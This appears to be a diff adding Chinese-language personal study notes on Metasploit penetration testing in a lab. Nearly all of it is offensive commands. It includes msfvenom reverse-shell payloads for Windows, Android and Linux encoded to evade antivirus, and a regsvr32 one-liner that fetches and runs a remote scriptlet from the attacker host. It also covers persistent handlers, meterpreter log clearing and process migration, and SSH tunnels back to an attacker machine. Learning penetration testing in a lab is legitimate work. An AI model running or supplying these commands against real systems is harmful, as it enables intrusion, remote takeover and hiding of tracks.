@@ -1,0 +1,253 @@
+msf:可能不久也会被抛弃。
+
+msf：
+启动postgresql数据库-->/etc/init.d/postgresql restart-->初始化数据库: msfdb init-->
+查看连接：msf下执行:db_status
+
+setg  //设置全局变量，只要msf不关闭，其他模块使用的还是这个值。
+
+L：local本地，一般指kali.
+R: 目标；
+sessions：查看会话.
+	-i  //列出   
+	-K //清除所有会话
+sessions -i 1  //切换进会话1，直接执行命令之类的。
+
+handler：开启一个后门监听。
+run/exploit -j //后台运行
+
+在本机的777端口监听，使用反连的apylaod，等其他主机来连：
+handler -H 192.168.43.103 -P 7777(端口) -p(指定payload) windows/x64/meterpreter/reverse_tcp
+jobs：查看运行的任务
+kill 1 //关闭运行的1号任务
+rename_job 1 testz //重命名或标签
+msf下使用namp：db_nmap命令.
+
+hosts -c mac //仅列出mac字段
+services //查看扫描的服务
+db_export 1.xml //导出扫描的服务端口等信息
+
+内网外网访问核心原理：
+正常是外网机器A和外网机器B能直接访问，如A先访问B的某个端口，则B知道A的端口，端口和端口映射关系；外网和内网之间的黑盒子理解为动态NAT技术，差不多也是端口和端口的映射。
+
+
+msf后门监听模块：
+exploit -j -z gandler //后台持续监听(-j 任务下进行攻击，在后台；-z 攻击后不进入会话交互界面)
+set ExitOnSession false //让connection保持连接(即使session退出，仍保持listening状态)
+set SessionCommunication Timeout 0 //默认一个会话300s没活动，则被杀死，防止该情况，使用此命令。
+set SessionExpirationTimeout 0 //默认长时间后，会话被强制关闭，此命令，永不会被关闭
+set EnableStageEncoding true
+
+eg1: 对stage(相当于msf发往目标的payload)进行编码，尝试绕过杀软等.
+msf exploit(multi/handler) > set EnableStageEncoding true
+msf exploit(multi/handler) > set stageencoder x86/fnstenv mov
+msf exploit(multi/handler) > set stageencodingfallback false
+
+
+
+
+
+
+
+
+
+
+重启msf，重启数据库(postgresql)，一般就能连接数据库成功。
+
+workspace常用命令：
+workspace -a lbc //创建lbc工作空间
+
+
+
+
+
+
+
+ 
+
+
+
+
+渗透案例1：
+kali:192.168.43.103
+meta靶机:192.168.43.16
+win本机：192.168.43.132
+nmap -sV -sS -vv 192.168.43.16(靶机)-->
+
+
+
+eg2：
+msf > use exploit/multi/handler -->
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp常用的反弹模块 -->
+set lhost esth0或set lhost 192.168.43.103(localhost) 默认监听端口4444-->
+
+payloads三种类型：
+1.singles：独立载荷。
+2.stagers：传输器载荷，主要用于建立稳定的连接。
+3.stages：传输体载荷(需要以stagers为基础)，如shell、meterpreter等。最终控制权交给stages.
+
+
+msterpreter命令：
+portwd //端口转发
+route //看路由
+background //后台运行会话
+shell  //进入cmd终端
+getuid  //获取当前会话的用户名
+getpid //获取当前进程
+sysinfo  //看系统信息
+clearev  //清除日志
+
+
+
+ps //查看进程
+migrate 3//迁移到进程3(一般explorer.exe PID为进程号;)
+
+use exploit/multi/script/web_delivery  //web后门模块
+eg3：
+msf > use exploit/multi/script/web_delivery
+msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp //添加payload
+msf6 exploit(multi/script/web_delivery) > set lhost eth0 (或本机ip)
+msf6 exploit(multi/script/web_delivery) > set lport 6166 //设置端口
+
+msf6 exploit(multi/script/web_delivery) > show targets  //查看targets支持的语言环境
+msf6 exploit(multi/script/web_delivery) > set target 3(为Regsvr32)
+msf6 exploit(multi/script/web_delivery) > run
+-->得到regsvr32 /s /n /u /i:http://192.168.43.103:8080/qNwX5r2oE7Guyw.sct scrobj.dll
+windows靶机cmd运行：regsvr32 /s /n /u /i:http://192.168.43.103:8080/qNwX5r2oE7Guyw.sct scrobj.dll
+注：需要关闭实时保护之类的。
+-->msf直接接收到session. (当前窗口直接ctrl+c  sessions)
+win10对应的进程为svchost.exe.
+meterpreter > pwd //查看win10靶机所在路径
+meterpreter > upload z1.txt  //将本地z1.txt上传到靶机当前路径  download类似
+meterpreter > getuid //查看权限
+
+
+exploit/multi/http/phpmyadmin_lfi_rce模块：
+set rhosts-->set target 其中paylaod默认-->workspace -d test1
+ 
+msf > db_import /root/Desktop/wz6.xml  //导入nmap扫描的文件
+-->hosts 查看成功
+msf > grep exploit search ssh //搜索ssh相关模块
+
+eg1：利用powershellfantanshell：
+msf > > use exploit/multi/script/web_delivery 
+msf > set payload windows/x64/meterpreter/reverse_tcp_rc4  //编码加密
+msf > set lhost 192.168.43.103
+msf > show targets -->set target 2 -->run
+在靶机上执行该命令即可。 需关闭实时保护。
+
+
+msfvenom命令：
+msfvenom -l payloads //列出
+
+eg1：
+kali > msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.43.132 LPORT=2306  --platform windows -f exe  PrependMigrate=true PrependMigrateProc=explorer.exe   -o lkz.exe
+或者无PrependMigrate=true PrependMigrateProc=explorer.exe(它是设置自动迁移)
+msf > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp_rc4
+设置lhost lport->run 本地监听。 -->kali > /etc/init.d/apache2 restart  -->使靶机通过web方式访问下载运行。
+
+dalvik：安装虚拟机
+eg2：安卓虚拟机案例
+kali > msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.43.103 LPORT=2309 -f raw > shell.apk
+msf > use exploit/multi/handler -->
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp -->
+设置lhost lport->run 本地监听-->
+安卓直接本地双击，默认网络不设代理。获取session成功。
+
+原理：不设代理实质安卓模拟器只是真机同一ip的另一端口而已。
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.103 LPORT=2316 R > testzkp6.apk也可以。
+
+powershell后缀：ps1(是一非L)
+bind：正向
+
+eg3：powershell反弹
+msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.43.103 LPORT=2326 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
+其中-i 3：指3次编码
+msf6 exploit(multi/handler) > set payload windows/powershell_reverse_tcp -->
+设置lhost lport->run 本地监听-->
+注：.\shell.ps1报错->在此系统上禁止运行脚本.
+
+eg4：正向连接
+windows
+kali > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.103 LPORT=2336 -a x86 --platform Windows -f c
+
+
+
+
+
+重点命令：
+windows
+kali > msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.43.103 LPORT=2309 -f raw > shell.apk
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp 
+设置lhost lport->run 本地监听。
+
+
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=外网ip LPORT=2333 -a x86 --platform Linux -f elf > shell.elf
+
+
+
+
+自动化msf命令：
+kali > nano msf_auto1.rc 输入：
+----------------1s----------                                        
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp_rc4
+set lhost 192.168.43.103
+set lport 3366
+run -j
+--------------1e----------
+kali >  msfconsole -r msf_auto1.rc 
+
+获取session失败？
+1. x64 x32等架构不符。
+2.配置 端口等 不符。
+3.安全设备或防火墙等配置(如阿里等vps需要allow port)
+
+
+内网到外网使用的NAT技术；
+外网到内网使用的端口转发技术。
+
+
+
+
+端口转发：
+portfwd  //meterpreter命令
+Add	//创建转发，msf外的也行
+Delete	//从转发列表删除先前的
+List	//列出
+Flush	//删除转发列表中的所有端口
+-l	//本地监听端口
+-p	//指定目标机器需转发的端口
+-r [target]	//目标机器的ip或主机名
+
+eg1：
+meterpreter > portfwd add -l 3336 -r 192.168.131.128 -p 3389   //访问本地333相当于访问192.168.131.128:3389
+#rdesktop -f -a 16 127.0.0.1:3333 -r sound:off -g 1024*768
+-f 	全屏  //最好不要全屏
+-p	密码
+-g	分辨率
+-u	用户名
+-a	彩色  //16位色最高了
+sound:off	关闭回传声音
+ubuntu安装：sudo apt install rdesktop
+
+
+ssh之三种端口转发：
+1.本地端口-->目标端口   ssh隧道
+ssh -L 本地网卡地址:本地端口A:目标地址:目标端口 root@远程主机
+监听在端口A
+2.远程端口转发：
+受害者机器访问我们的vps的A端口，被转发到vps的B端口-->攻击机.
+ssh -R 远程网卡地址:远程端口A:目标地址:目标端口B(即到攻击机的端口) root@远程主机
+监听在端口A
+3.动态端口转发：相当于NAT
+先绑定一个本地端口A，但目标地址:目标端口B不固定，由发起的请求决定。
+ssh -D localhost:9050 root@VPS_IP -p 端口
+
+windows server 08 R2设置远程桌面登录：
+计算机->属性->远程设置->允许运行任意的登录开启->选择用户(我选的e)
+远程桌面服务管理器-->会话下能看到有个活动正在连接，此处能看到有多少用户正在连接。
+连接成功。
